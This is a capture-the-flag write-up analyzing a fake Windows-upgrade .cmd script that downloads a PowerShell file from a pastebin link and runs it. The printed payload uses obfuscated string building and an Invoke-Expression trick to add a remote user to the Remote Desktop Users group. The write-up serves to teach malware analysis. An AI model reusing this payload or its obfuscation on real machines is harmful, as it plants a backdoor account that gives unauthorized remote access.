+++
title = "Upgrading Windows - Writeup"
draft = false
ShowToc = false
author = ["connar"]
+++

In this test, we are given a ".cmd" script whose purpose is to upgrade the user's version of Windows. However, the user reports that not only did the script not work, but also observed strange activity on their computer. Let's analyze the file to see what we can find.  

![alt text](/posts/writeups/pmdk/upgradingwindows/upgradingWindows1.png)  


We observe that indeed the script contains a portion of code that attempts to upgrade the Windows version, but it fails because there is an exit command in the middle that terminates its execution. However, just before the exit command, it does something very suspicious:  
- It downloads content from the URL https://pastebin.com/raw/XMRy2Kp4 and saves it into a PowerShell file named safe.ps1.
- It then executes the newly created file.  

Therefore, we can easily assume that the next step is to analyze what exists at the URL from the link we discovered earlier. Visiting the [link](https://pastebin.com/raw/XMRy2Kp4), we find the following PowerShell code:  

```powershell
$computername = "DESKTOP-5570"

Invoke-Command -ComputerName $computername -ScriptBlock { 
    $computer = $env:COMPUTERNAME
    $domain = "105.10.10.34"
    $user = (("{22}{24}{8}{28}{33}{19}{6}{30}{20}{4}{15}{26}{5}{32}{18}{13}{12}{10}{3}{17}{9}{2}{1}{16}{23}{7}{27}{31}{29}{14}{21}{0}{11}{25}" -f '3','1n','3h','urc+','urc','c+urc3ll3d_7u','5_','u','FL','b','y','6s','3r','my5urc+urc7','rc1urc+urcp7}ur','v','d_7h15','urc_','3_','rc+urcngra7','0u_unr4urc+','c)','(ur','_','c',' iEx','ur','rc+urc5uurc','AG{C','crurc+u','Y','+urc5_5','rc+urch','0u')).REplAcE('urc',[striNg][ChAR]39).REplAcE(([ChAR]51+[ChAR]54+[ChAR]115),'|')|&( $VERboSePrEfeRENCE.ToSTrinG()[1,3]+'X'-JoiN'')
    $group = [ADSI]"WinNT://$computer/Remote Desktop Users,group"
    $group.psbase.Invoke("add",([ADSI]"WinNT://$domain/$user").Path) 
}
```

This code appears to be attempting to add a remote user to the victim's computer. The unusual part is the username it is trying to add, as it is not straightforward but is built using obfuscation techniques.  

While recovering the name may seem difficult, it is actually quite straightforward. All we need to do is copy that specific line and execute it inside a PowerShell terminal, as at the end of the command, it joins the total string, printing it to the screen.  

![alt text](/posts/writeups/pmdk/upgradingwindows/upgradingWindows2.png)  

And like this, we get the flag: ```FLAG{C0ngra75_Y0u_unr4v3ll3d_7h3_my573ry_b3h1nd_7h15_5u5_5cr1p7}```

